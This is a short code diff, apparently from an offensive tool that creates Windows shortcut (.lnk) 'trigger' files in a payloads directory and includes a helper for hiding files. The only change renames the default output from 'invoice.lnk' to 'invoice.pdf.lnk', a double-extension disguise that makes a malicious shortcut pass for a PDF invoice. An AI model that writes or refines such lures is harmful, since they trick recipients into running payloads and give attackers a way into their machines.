@@ -35,7 +35,7 @@ def set_file_hidden(file_path: str):
     except Exception as e:
         print(f"Error setting file attributes: {e}")
 
-def create_lnk_trigger(target_bin: str, args: str, icon_src: str, icon_index: int, description: str, output_filename: str = "invoice.lnk"):
+def create_lnk_trigger(target_bin: str, args: str, icon_src: str, icon_index: int, description: str, output_filename: str = "invoice.pdf.lnk"):
     """Create an LNK trigger file in the payloads directory
 
     Args:
